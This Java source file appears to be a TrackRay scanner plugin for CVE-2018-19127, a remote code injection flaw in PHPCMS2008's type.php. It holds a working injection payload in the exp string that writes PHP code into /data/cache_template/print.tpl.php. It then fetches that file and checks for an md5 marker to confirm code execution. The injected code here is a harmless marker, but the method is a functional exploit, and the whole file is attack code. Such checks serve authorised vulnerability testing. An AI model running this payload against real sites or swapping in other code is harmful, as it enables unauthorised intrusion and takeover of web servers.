package com.trackray.module.plugin.webapp.phpcms;

import com.trackray.base.annotation.Plugin;
import com.trackray.base.annotation.Param;
import com.trackray.base.annotation.Rule;
import com.trackray.base.plugin.CommonPlugin;
import org.apache.commons.lang.StringUtils;

import java.util.Map;

@Rule(params = {@Param(key = "target", desc = "目标地址"),} )
@Plugin(title = "PHPCMS2008 type.php远程代码注入漏洞（CVE-2018-19127）",
        desc = "CVE-2018-19127",
        link = "http://sec.sangfor.com.cn/events/178.html",
        author = "blue" )
public class PHPcms2008rce extends CommonPlugin<String> {
    String verify = "/data/cache_template/print.tpl.php";
    String exp = "/type.php?template=tag_($s,$b){$s=1;}@var_dump(md5(233));{//../print";
    String target;
    @Override
    public boolean check(Map<String, Object> param) {
        this.target = param.get("target").toString();

        crawlerPage.getRequest().setUrl(target+exp);
        fetcher.run(crawlerPage);

        crawlerPage.getRequest().setUrl(target+verify);
        fetcher.run(crawlerPage);

        if (StringUtils.contains(crawlerPage.getResponse().getStatus().getContentString(),"e165421110ba03099a1c0393373c5b43"))
            return true;
        return false;
    }

    @Override
    public String start() {
        return target+verify+"存在phpcms2008 RCE漏洞 payload:"+exp;
    }
}
